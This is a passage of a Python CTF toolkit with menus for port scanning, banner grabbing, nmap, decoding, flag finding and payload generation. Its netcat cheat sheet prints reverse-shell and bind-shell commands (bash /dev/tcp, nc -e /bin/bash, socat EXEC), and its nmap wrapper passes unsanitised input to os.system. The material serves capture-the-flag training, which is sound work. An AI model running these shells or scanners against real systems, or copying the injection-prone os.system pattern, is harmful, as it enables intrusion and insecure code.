            "Port scanner (socket-based)",
            "Banner grabber",
            "Netcat helper & common commands",
            "Nmap quick scan wrapper",
            "Protocol decoder (hex stream → ASCII)",
        ])
        if c == 0: break
        elif c == 1: port_scan()
        elif c == 2: banner_grab()
        elif c == 3: nc_helper()
        elif c == 4: nmap_scan()
        elif c == 5: proto_decode()

def port_scan():
    section("PORT SCANNER")
    host  = get_input("Host:")
    ports = get_input("Ports (e.g. 1-1000 or 80,443,8080):", "1-1000")

    if '-' in ports:
        lo, hi = map(int, ports.split('-'))
        port_list = range(lo, hi+1)
    else:
        port_list = [int(p) for p in ports.split(',')]

    open_ports = []
    info(f"Scanning {host}... (Ctrl-C to stop)")
    for port in port_list:
        try:
            s = socket.socket()
            s.settimeout(0.3)
            if s.connect_ex((host, port)) == 0:
                open_ports.append(port)
                ok(f"OPEN  {port}/tcp")
            s.close()
        except KeyboardInterrupt:
            break
        except: pass

    if open_ports:
        ok(f"\nOpen ports: {', '.join(map(str, open_ports))}")
    else:
        warn("No open ports found.")

def banner_grab():
    section("BANNER GRABBER")
    host = get_input("Host:")
    port = int(get_input("Port:"))
    payload = get_input("Send (Enter for HTTP HEAD, or custom bytes in hex):", "")

    try:
        s = socket.socket()
        s.settimeout(5)
        s.connect((host, port))

        if not payload:
            s.send(b"HEAD / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")
        elif all(c in string.hexdigits + ' ' for c in payload):
            s.send(bytes.fromhex(payload.replace(' ','')))
        else:
            s.send(payload.encode() + b'\r\n')

        banner = s.recv(4096)
        ok(f"Banner ({len(banner)} bytes):")
        print(f"  {banner.decode('utf-8','replace')[:500]}")
        s.close()
    except Exception as ex:
        err(f"Error: {ex}")

def nc_helper():
    section("NETCAT HELPER")
    print(f"""
  {C.CYAN}Essential netcat commands:{C.RESET}

  Connect:        nc HOST PORT
  Listen:         nc -lvnp PORT
  Send file:      nc HOST PORT < file.txt
  Receive file:   nc -lvnp PORT > received.txt
  Reverse shell:  bash -i >& /dev/tcp/HOST/PORT 0>&1
  Bind shell:     nc -lvnp PORT -e /bin/bash

  {C.CYAN}With pwntools (Python):{C.RESET}
  from pwn import *
  p = remote('HOST', PORT)
  p.recvuntil(b'prompt:')
  p.sendline(b'payload')
  p.interactive()

  {C.CYAN}OpenSSL (for TLS):{C.RESET}
  openssl s_client -connect HOST:443

  {C.CYAN}socat (advanced):{C.RESET}
  socat TCP:HOST:PORT STDIN
  socat TCP-LISTEN:PORT,fork EXEC:/bin/bash
    """)

def nmap_scan():
    section("NMAP SCAN WRAPPER")
    host = get_input("Target host/IP:")
    mode = get_input("Mode (1=quick, 2=full, 3=version+scripts, 4=UDP top20):", "1")

    cmds = {
        "1": f"nmap -T4 --top-ports 100 {host}",
        "2": f"nmap -T4 -p- {host}",
        "3": f"nmap -T4 -sV -sC -p- {host}",
        "4": f"nmap -sU --top-ports 20 {host}",
    }
    cmd = cmds.get(mode, cmds["1"])
    info(f"Running: {cmd}")
    os.system(cmd)

def proto_decode():
    section("HEX STREAM DECODER")
    data = get_input("Hex stream (space-separated bytes or continuous hex):")
    try:
        clean = data.replace(' ','').replace('0x','').replace('\\x','')
        raw = bytes.fromhex(clean)
        print(f"\n  {C.CYAN}ASCII:{C.RESET}   {raw.decode('utf-8','replace')}")
        print(f"  {C.CYAN}Repr:{C.RESET}    {repr(raw)}")
        print(f"  {C.CYAN}Length:{C.RESET}  {len(raw)} bytes")

        # Try to detect protocol
        if raw[:4] == b'\x1f\x8b\x08': info("Detected: GZIP compressed data")
        elif raw[:2] == b'PK':          info("Detected: ZIP archive")
        elif raw[:4] == b'\x7fELF':     info("Detected: ELF binary")
        elif raw[:8] == b'\x89PNG\r\n': info("Detected: PNG image")
        elif raw[:2] == b'MZ':          info("Detected: PE/Windows executable")
        elif b'HTTP' in raw[:10]:       info("Detected: HTTP response/request")
        elif raw[:4] in [b'\xff\xd8\xff\xe0', b'\xff\xd8\xff\xe1']:  info("Detected: JPEG image")
    except Exception as ex:
        err(f"Decode error: {ex}")

# ══════════════════════════════════════════════════════════════════════════════
#  8. UTILITIES
# ══════════════════════════════════════════════════════════════════════════════

def utils_menu():
    while True:
        c = menu("UTILITIES", [
            "Number converter (dec/hex/bin/oct)",
            "String to bytes / bytes to string",
            "Regex flag finder in text/file",
            "URL encode / decode",
            "Random payload generator",
            "CTF flag validator",
            "Python one-liners cheatsheet",
            "ROT brute force (all 25 shifts)",
            "Frequency analysis",
        ])
        if c == 0: break
        elif c == 1: num_convert()
        elif c == 2: str_bytes()
        elif c == 3: flag_finder()
        elif c == 4: url_enc()
        elif c == 5: rand_payload()
        elif c == 6: flag_validate()
        elif c == 7: oneliner_sheet()
        elif c == 8: rot_brute()
        elif c == 9: freq_analysis()

def num_convert():
    section("NUMBER CONVERTER")
    val = get_input("Value (decimal, 0xHEX, 0bBIN, or 0oOCT):")
    try:
        n = int(val, 0) if val.startswith('0') and len(val) > 1 else int(val)
        ok(f"Decimal:     {n}")
        ok(f"Hex:         0x{n:x}  /  {n:X}")
        ok(f"Binary:      {bin(n)}")
        ok(f"Octal:       {oct(n)}")
        if 0 <= n <= 0x10ffff:
            try: ok(f"Unicode:     {chr(n)}")
            except: pass
        if n < 2**64:
            try:
                b = n.to_bytes((n.bit_length()+7)//8 or 1, 'big')
                ok(f"Big-endian:  {b.decode('utf-8','replace')}  ({b.hex()})")
            except: pass
    except Exception as ex:
        err(f"Conversion error: {ex}")

def str_bytes():
    section("STRING ↔ BYTES")
    mode = get_input("(1) String → bytes  (2) Bytes → string  (3) Bytes → int  (4) Int → bytes:", "1")
    if mode == "1":
        s = get_input("String:")
        b = s.encode('utf-8')
        ok(f"Hex:    {b.hex()}")
        ok(f"Repr:   {repr(b)}")
        ok(f"Decimal list: {list(b)}")
    elif mode == "2":
        h = get_input("Hex bytes:")
        b = bytes.fromhex(h.replace(' ',''))
        ok(f"UTF-8:  {b.decode('utf-8','replace')}")
        ok(f"Latin1: {b.decode('latin-1','replace')}")
    elif mode == "3":
        h = get_input("Hex bytes:")
        b = bytes.fromhex(h.replace(' ',''))
        ok(f"Integer (big-endian): {int.from_bytes(b,'big')}")
        ok(f"Integer (little-endian): {int.from_bytes(b,'little')}")
    elif mode == "4":
        n = int(get_input("Integer:"))
        b = n.to_bytes((n.bit_length()+7)//8 or 1, 'big')
        ok(f"Bytes: {b}")
        ok(f"Hex:   {b.hex()}")
        ok(f"ASCII: {b.decode('utf-8','replace')}")

def flag_finder():
    section("FLAG FINDER")
    source = get_input("Input text or file path:")
    patterns = [
        r'[A-Z_]{2,10}\{[^}]{3,50}\}',
        r'flag\{[^}]+\}',
        r'CTF\{[^}]+\}',
        r'SNCO\{[^}]+\}',
        r'picoCTF\{[^}]+\}',
    ]

    if os.path.exists(source):
        try:
            with open(source, 'rb') as f:
                text = f.read().decode('utf-8','replace')
        except:
            with open(source, 'r', errors='replace') as f:
                text = f.read()
    else:
        text = source

    found = False
    for pat in patterns:
        for m in re.findall(pat, text, re.IGNORECASE):
            flag(m)
            clip(m)
            found = True

    if not found:
        warn("No flags found with standard patterns.")
        info("Check if flag is base64 encoded or split across lines.")

def url_enc():
    section("URL ENCODE / DECODE")
    s = get_input("Input:")
    ok(f"URL encoded:       {quote(s)}")
    ok(f"URL encoded (all): {quote(s, safe='')}")
    ok(f"URL decoded:       {unquote(s)}")
    ok(f"Double encoded:    {quote(quote(s, safe=''), safe='')}")

def rand_payload():
    section("RANDOM PAYLOAD GENERATOR")
    n = int(get_input("Payload length:", "100"))
    mode = get_input("Type: (1) cyclic  (2) random bytes  (3) A*n  (4) shell metachars:", "1")
    if mode == "1":
        chars = string.ascii_lowercase
        cycle = 4
        pat = ''.join(
            chars[(i//cycle) % len(chars)] + chars[(i//cycle + 1) % len(chars)]
            + chars[(i//cycle + 2) % len(chars)] + chars[(i//cycle + 3) % len(chars)]
            for i in range(0, n, cycle)
        )[:n]
        ok(f"Cyclic: {pat}")
        clip(pat)
    elif mode == "2":
        import random
        b = bytes(random.randint(0,255) for _ in range(n))
        ok(f"Random hex: {b.hex()}")
    elif mode == "3":
        ok(f"A*{n}: {'A'*n}")
        clip('A'*n)
    elif mode == "4":
        metas = r"'; \"| && || ; ` $ ( ) { } [ ] # ~ ! % ^ & * + - = < >"
        ok(f"Shell metacharacters: {metas}")

def flag_validate():
    section("FLAG VALIDATOR")
    f = get_input("Flag to validate:")
    formats = [
        (r'^[A-Z_]{2,10}\{[a-zA-Z0-9_\-!@#$%^&*()+=<>?./\\, ]+\}$', "Standard CTF format"),
        (r'^picoCTF\{', "picoCTF"),
        (r'^SNCO\{',    "SNCO"),
        (r'^HTB\{',     "HackTheBox"),
        (r'^CTF\{',     "Generic CTF"),
    ]
    for pat, name in formats:
        if re.match(pat, f, re.IGNORECASE):
            ok(f"Format: {name}")
    ok(f"Length: {len(f)}")
    if '{' in f and '}' in f:
        inner = f[f.index('{')+1:f.index('}')]
        ok(f"Inner value: {inner}")
        # Quick decode attempts
        magic_decode(inner)

def oneliner_sheet():
    section("PYTHON ONE-LINERS CHEATSHEET")
    print(f"""
  {C.CYAN}Encoding:{C.RESET}
    Base64 decode:   python3 -c "import base64; print(base64.b64decode('BASE64').decode())"
    Hex decode:      python3 -c "print(bytes.fromhex('HEXDATA').decode())"
    ROT13:           python3 -c "import codecs; print(codecs.decode('TEXT','rot_13'))"
    XOR single:      python3 -c "ct=bytes.fromhex('HEX'); print(bytes(b^KEY for b in ct))"

  {C.CYAN}RSA:{C.RESET}
    Decrypt:         python3 -c "from Crypto.Util.number import long_to_bytes; print(long_to_bytes(pow(C,D,N)))"
    Factor small n:  python3 -c "import sympy; n=N; print(sympy.factorint(n))"

  {C.CYAN}Hash:{C.RESET}
    MD5:             python3 -c "import hashlib; print(hashlib.md5(b'text').hexdigest())"
    SHA256:          python3 -c "import hashlib; print(hashlib.sha256(b'text').hexdigest())"

  {C.CYAN}File analysis:{C.RESET}
    strings + grep:  strings -a file | grep -Ei 'flag|ctf|key'
    xxd dump:        xxd file | head -20
    file type:       file binary; binwalk binary

  {C.CYAN}Pwntools:{C.RESET}
    Start process:   p = process('./bin')  or  p = remote('HOST', PORT)
    Receive until:   p.recvuntil(b'> ')
    Send:            p.sendline(b'PAYLOAD')
    Cyclic:          from pwn import *; cyclic(200)
    Find offset:     cyclic_find(0x61616161)  # from SIGSEGV value

  {C.CYAN}Network:{C.RESET}
    Quick request:   python3 -c "import urllib.request; print(urllib.request.urlopen('URL').read())"
    POST request:    python3 -c "import requests; r=requests.post('URL',data={{'k':'v'}}); print(r.text)"
    """)

def rot_brute():
    section("ROT BRUTE FORCE (all 25 shifts)")
    s = get_input("Input text:")
    for n in range(1, 26):
        shifted = ''.join(
            chr((ord(c)-65+n)%26+65) if c.isupper() else
            chr((ord(c)-97+n)%26+97) if c.islower() else c
            for c in s
        )
        fmatch = re.search(r'[A-Za-z_]{2,10}\{[^}]+\}', shifted)
        color = C.GREEN if fmatch else C.WHITE
        print(f"  {C.CYAN}ROT{n:2d}{C.RESET}  {color}{shifted[:80]}{C.RESET}")
        if fmatch:
            flag(shifted)
            clip(shifted)

def freq_analysis():
    section("FREQUENCY ANALYSIS")
    text = get_input("Input ciphertext (letters only ideally):")
    letters = [c.upper() for c in text if c.isalpha()]
    if not letters:
        err("No letters found."); return

    freq = Counter(letters)
    total = len(letters)
    english_order = 'ETAOINSHRDLCUMWFGYPBVKJXQZ'

    print(f"\n  {'Char':>4}  {'Count':>6}  {'%':>6}  Bar")
    for char, count in freq.most_common():
        pct = count / total * 100
        bar = '█' * int(pct * 2)
        print(f"  {C.CYAN}{char:4}{C.RESET}  {count:6}  {pct:5.1f}%  {C.YELLOW}{bar}{C.RESET}")

    most_frequent = freq.most_common(1)[0][0]
    info(f"\nMost frequent: '{most_frequent}'")
    info(f"If simple substitution cipher:")
    info(f"  '{most_frequent}' → 'E' suggests shift of {(ord(most_frequent)-ord('E'))%26}")
    info(f"  '{most_frequent}' → 'T' suggests shift of {(ord(most_frequent)-ord('T'))%26}")

# ══════════════════════════════════════════════════════════════════════════════
#  AUTO-MODE & FILE TRIAGE
# ══════════════════════════════════════════════════════════════════════════════

def auto_triage(path):
    """Auto-detect file type and run appropriate analysis."""
    section(f"AUTO TRIAGE: {path}")
    if not os.path.exists(path):
        err(f"File not found: {path}"); return

    out = _run(f"file '{path}'").lower()
    info(f"File type: {out.strip()}")

    # Check strings for flags first
    strs = _run(f"strings -a '{path}' | grep -Ei '[a-z_]{{2,10}}\\{{[^}}]+\\}}'")
    for line in strs.split('\n'):
        if line.strip():
            flag(line.strip())

    if 'pcap' in out or 'capture' in out:
        pcap_analyser()
    elif 'elf' in out or 'executable' in out:
        binary_recon()
    elif 'png' in out or 'jpeg' in out or 'gif' in out or 'image' in out:
        steg_tester()
    elif 'zip' in out or 'archive' in out or 'compressed' in out:
        file_carver()
    elif 'text' in out or 'ascii' in out:
        with open(path) as f:
            content = f.read()
        magic_decode(content[:500])
    else:
        file_analysis()

# ══════════════════════════════════════════════════════════════════════════════
#  MAIN MENU
# ══════════════════════════════════════════════════════════════════════════════

def check_deps():
    """Print installed/missing optional dependencies."""
    deps = {
        'pycryptodome': HAS_CRYPTO,
        'gmpy2':        HAS_GMPY2,
        'requests':     HAS_REQUESTS,
        'owiener':      HAS_OWIENER,
        'pyperclip':    HAS_CLIP,
    }
    missing = [k for k, v in deps.items() if not v]
    if missing:
        warn(f"Optional deps missing (some features limited): {', '.join(missing)}")
        info(f"Install: pip install {' '.join(missing)}")
    else:
        ok("All optional dependencies installed.")

def main():
    parser = argparse.ArgumentParser(description='SNCO Elite CTF Toolkit')
    parser.add_argument('--auto', metavar='FILE', help='Auto-triage a file')
    parser.add_argument('--magic', metavar='STRING', help='Magic decode a string')
    args = parser.parse_args()

    banner()
    check_deps()

    if args.auto:
        auto_triage(args.auto)
        return

    if args.magic:
        magic_decode(args.magic)
        return

    while True:
        c = menu("MAIN MENU — SNCO Elite Toolkit", [
            "🔓  Encoding / Magic Decoder",
            "🔐  Cryptography Attacks  (RSA, Vigenere, XOR, Hash)",
            "🔍  Reverse Engineering   (static, dynamic, patching)",
            "🌐  Web Exploitation      (SQLi, XSS, LFI, JWT, SSRF)",
            "🔎  Forensics             (files, steg, PCAP, memory)",
            "🌍  OSINT                 (recon, metadata, dorks)",
            "📡  Networking            (scan, banner, nmap)",
            "🛠   Utilities             (converters, payloads, cheatsheets)",
            "⚡  Auto-Triage a File",
        ])
        if c == 0:
            print(f"\n  {C.BOLD}{C.YELLOW}Good luck. Rank 1 is yours.{C.RESET}\n")
            break
        elif c == 1: magic_decode(get_input("String to magic-decode:"))
        elif c == 2: crypto_menu()
        elif c == 3: re_menu()
        elif c == 4: web_menu()
        elif c == 5: forensics_menu()
        elif c == 6: osint_menu()
        elif c == 7: net_menu()
        elif c == 8: utils_menu()
        elif c == 9:
            path = get_input("File path:")
            auto_triage(path)

if __name__ == '__main__':
    main()